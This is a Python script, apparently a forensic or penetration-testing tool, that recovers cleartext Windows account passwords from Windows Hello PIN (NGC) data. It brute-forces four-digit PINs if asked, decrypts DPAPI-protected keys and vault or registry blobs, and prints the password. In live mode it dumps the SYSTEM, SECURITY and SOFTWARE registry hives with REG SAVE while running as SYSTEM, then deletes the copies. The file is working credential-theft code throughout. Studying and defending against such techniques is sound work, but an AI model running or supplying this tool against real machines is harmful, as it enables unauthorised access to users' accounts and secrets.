#!/usr/bin/python3
# -*- coding: utf-8 -*-
#
# Copyright 2020, Tijl "Photubias" Deneut <tijl.deneut@howest.be>

import optparse, os, sys
from Crypto.Cipher import PKCS1_v1_5, AES
from Crypto.PublicKey import RSA
from Registry.Registry import Registry
from subprocess import Popen, PIPE

"""
This script mostly calls the other scripts in order, step by step
"""

def check_parameters(options, args):
    if not args or len(args) != 1:
        sys.exit('You must provide the Windows folder.')
    if not options.pin and not options.pinbrute:
        sys.exit('You must provide either a PIN or the pinbrute option.')

def reverseByte(bByteInput):
    sReversed = ''
    sHexInput = bByteInput.hex()
    for x in range(-1, -len(str(sHexInput)), -2): sReversed += sHexInput[x-1] + sHexInput[x]
    return bytes.fromhex(sReversed)

def getCryptUsername(sSoftware, sSID):
    with open(sSoftware, 'rb') as oFile:
        oReg = Registry(oFile)
        oRegKey = oReg.open('Microsoft\\Windows\\CurrentVersion\\Authentication\\Credential Providers\\{D6886603-9D2F-4EB2-B667-1971041FA96B}')
        for oKey in oRegKey.subkeys():
            if oKey.name() in sSID:
                return oKey.subkey('UserNames').subkeys()[0].name()
    return '<Unknown>'

def constructRSAKEY(sDATA, verbose = False):
    from Crypto.PublicKey import RSA
    def calcPrivateKey(e,p,q):
        def recurseFunction(a,b):
            if b==0:return (1,0)
            (q,r) = (a//b,a%b)
            (s,t) = recurseFunction(b,r)
            return (t, s-(q*t))
        t = (p-1)*(q-1) ## Euler's totient
        inv = recurseFunction(e,t)[0]
        if inv < 1: inv += t
        return inv
    
    ## Parsing based on (but wrong endian): https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/540b7b8b-2232-45c8-9d7c-af7a5d5218ed
    bDATA = bytes.fromhex(sDATA)
    if not bDATA[:4] == b'RSA2': exit('[-] Error: not an RSA key!')
    iBitlen = int(reverseByte(bDATA[4:8]).hex().encode(),16)
    iPubExpLen = int(reverseByte(bDATA[8:12]).hex().encode(),16)
    iModulusLen = int(reverseByte(bDATA[12:16]).hex().encode(),16)
    iPLen = int(reverseByte(bDATA[16:20]).hex().encode(),16)
    iQLen = int(reverseByte(bDATA[20:24]).hex().encode(),16)
    iOffset = 24
    iPubExp = int(reverseByte(bDATA[iOffset:iOffset+iPubExpLen]).hex().encode(),16)
    iOffset += iPubExpLen
    iModulus = int(bDATA[iOffset:iOffset+iModulusLen].hex().encode(),16)
    iOffset += iModulusLen
    iP = int(bDATA[iOffset:iOffset+iPLen].hex().encode(),16)
    iOffset += iPLen
    iQ = int(bDATA[iOffset:iOffset+iQLen].hex().encode(),16)
    if verbose:
        print('[!] BitLength      : ' + str(iBitlen) + ' bit')
        print('[!] Modulus Length : ' + str(iModulusLen) + ' bytes')
        print('[!] Prime Lengths  : ' + str(iPLen) + ' bytes')
    if not iModulus == iP*iQ: exit('[-] Prime numbers do not currespond to the public key')
    iPrivateKey = calcPrivateKey(iPubExp, iP, iQ)
    try: oRSAKEY = RSA.construct((iModulus,iPubExp,iPrivateKey,iP,iQ)) ## oRSAKEY = RSA.construct((n,e,d,p,q))
    except: exit('[-] Error constructing RSA Key')
    return oRSAKEY

def parseDecryptPin(bData, boolVerbose = False):
    if len(bData)<(32*3): exit('[-] Decrypted data not long enough')
    bUnkPin = bData[-(32*3):-(32*2)]
    bDecryptPin = bData[-(32*2):-32]
    bSignPin = bData[-32:]
    if boolVerbose:
        print('Unknown PIN : ' + bUnkPin.hex())
        print('Decrypt PIN : ' + bDecryptPin.hex())
        print('Sign PIN    : ' + bSignPin.hex())
    return bDecryptPin        

#def main():
#    
        
if __name__ == '__main__':
    """Utility core."""
    usage = (
        'usage: %prog windows_folder\n\n'
        'It calls and parses the other scripts to extract cleartext Windows Passwords\n'
        'Make sure to run as SYSTEM when done on live Windows environment')

    parser = optparse.OptionParser(usage=usage)
    parser.add_option('--pin', metavar='STRING', dest='pin', help='Windows Hello PIN')
    parser.add_option('--pinbrute', metavar='BOOL', dest='pinbrute', action="store_true", help='... or brute force PIN 0000 to 9999')
    parser.add_option('--registry', metavar='BOOL', dest='registry', action="store_true", help='Use SOFTWARE registry instead of Vault to extract password')
    parser.add_option('--live', metavar='BOOL', dest='live', action="store_true", help='Required for a live run to dump Registry Hives, run as SYSTEM')
    
    (options, args) = parser.parse_args()
    check_parameters(options, args)
    
    sWindowsbase = args[0]
    sNGCFolder = os.path.join(sWindowsbase, 'ServiceProfiles','LocalService','AppData','Local','Microsoft','Ngc')
    sCryptoFolder = os.path.join(sWindowsbase, 'ServiceProfiles', 'LocalService', 'AppData', 'Roaming', 'Microsoft', 'Crypto', 'Keys')
    sSystemMasterKeyFolder = os.path.join(sWindowsbase, 'System32', 'Microsoft', 'Protect', 'S-1-5-18', 'User')
    sVaultFolder = os.path.join(sWindowsbase, 'System32', 'config', 'systemprofile', 'AppData', 'Local', 'Microsoft', 'Vault', '4BF4C442-9B8A-41A0-B380-DD4A704DDB28')
    if not options.live:
        sSOFTWAREHive = os.path.join(sWindowsbase, 'System32', 'config', 'SOFTWARE')
        sSYSTEMHive = os.path.join(sWindowsbase, 'System32', 'config', 'SYSTEM')
        sSECURITYHive = os.path.join(sWindowsbase, 'System32', 'config', 'SECURITY')
    else:
        sSOFTWAREHive = 'SOFTWARE'
        sSYSTEMHive = 'SYSTEM'
        sSECURITYHive = 'SECURITY'
        os.system('REG SAVE HKLM\SYSTEM SYSTEM /Y >nul 2>&1')
        os.system('REG SAVE HKLM\SECURITY SECURITY /Y >nul 2>&1')
        os.system('REG SAVE HKLM\SOFTWARE SOFTWARE /Y >nul 2>&1')
    
    ## STEP1a: NGC Folders
    import ngcparse
    arrResult = ngcparse.main(sNGCFolder, boolOutput = False) ## Array of NGC GUID METADATA [0], PROTECTOR list [1] and ITEM list [2]
    
    for lItem in arrResult:
        arrNGCData = lItem[0]
        arrProtectors = lItem[1]
        arrItems = lItem[2]
        #print(getCryptUsername(sSOFTWAREHive,arrNGCData[1]))
    
    ## STEP1b: I know, only working with the last of the NGC Files here, TODO: adjust in case multiple accounts have a PIN
    sUserSID = arrNGCData[1]
    bRSAData1 = b''
    sGUID1 = ''
    for arrProtector in arrProtectors:
        if arrProtector[1] == 'Microsoft Software Key Storage Provider': 
            sGUID1 = arrProtector[2]
            bRSAData1 = arrProtector[4]
    for arrItem in arrItems:
        if arrItem[1] == '//9DDC52DB-DC02-4A8C-B892-38DEF4FA748F': sGUID2 = arrItem[3]
    
    print('-' * 50)
    ## STEP2: Get User EncData (encrypted AES Key), AES IV and AES Encrypted Password
    if options.registry:
        ## Get it from Registry
        import ngcregistrydec
        arrUsers = ngcregistrydec.main(sSOFTWAREHive, boolOutput = False) ## Array of Users with SID [0], Username [1], list of EncData, IV, EncPassword
        for oUser in arrUsers:
            if oUser[0] in sUserSID:
                sUsername = oUser[1]
                bEncAESKEY = bytes.fromhex(oUser[2][0])
                bAESIV = bytes.fromhex(oUser[2][1])
                bAESDATA = bytes.fromhex(oUser[2][2])
    else:
        ## Get it from the Vault
        import ngcvaultdec
        print('[!] Decrypting vault, hold on ...')
        arrResult = ngcvaultdec.main(sVaultFolder, sSystemMasterKeyFolder, sSYSTEMHive, sSECURITYHive, sSOFTWAREHive, False)
        sUsername = arrResult[0]
        bEncAESKEY = bytes.fromhex(arrResult[1][0])
        bAESIV = bytes.fromhex(arrResult[1][1])
        bAESDATA = bytes.fromhex(arrResult[1][2])
    print('[+] Working on : ' + sUsername + ' (' + sUserSID + ')')
    
    ## STEP3a: Get decrypted RSA Keys for first GUID from Crypto Folder
    print('[!] Decrypting crypto keys, this might take a while')
    import ngccryptokeysdec
    if options.pinbrute: 
        sPIN = ''
        print('     PIN Bruteforce selected, this will take even longer ;-)')
    else: sPIN = options.pin
    try: 
        sRSAKEY1 = ngccryptokeysdec.main(sCryptoFolder, sSystemMasterKeyFolder, sSYSTEMHive, sSECURITYHive, sPIN, sGUID1, False).hex()
    except: 
        exit('[-] Error: PIN wrong or key in TPM?')
    oRSAKEY1 = constructRSAKEY(sRSAKEY1)
    oCipher1 = PKCS1_v1_5.new(oRSAKEY1)
    
    ## STEP3b: Use RSA KEY to decrypt the NGC Input Data
    try: bDecrRSAData1 = oCipher1.decrypt(bRSAData1, b'')
    except: exit('[-] Error decrypting the inputdata')
    sDecryptPin = parseDecryptPin(bDecrRSAData1).hex() ## Add "verbose=True" to get Decr PIN, Sign PIN and Unk PIN
    print('[!] Trying to decrypt user password')
    
    ## STEP4a: Get decrypted RSA Keys for second GUID from Crypto Folder
    sRSAKEY2 = ngccryptokeysdec.main(sCryptoFolder, sSystemMasterKeyFolder, sSYSTEMHive, sSECURITYHive, sDecryptPin, sGUID2, False).hex()
    oRSAKEY2 = constructRSAKEY(sRSAKEY2)
    oCipher2 = PKCS1_v1_5.new(oRSAKEY2)
    
    ## STEP4b: Decrypt AES key from Vault or Registry
    bAESKEY = oCipher2.decrypt(bEncAESKEY,b'')
    oCipher3 = AES.new(bAESKEY, AES.MODE_CBC, bAESIV)
    bCleartextResult = oCipher3.decrypt(bAESDATA)
    print('[+] User password : ' + bCleartextResult.decode('UTF-16LE').split('\x00')[0])
    #print('  ' + bCleartextResult.decode('UTF-16LE').split('\x00')[0])

    if options.live: ## Clean Up
        os.system('DEL SYSTEM')
        os.system('DEL SECURITY')
        os.system('DEL SOFTWARE')
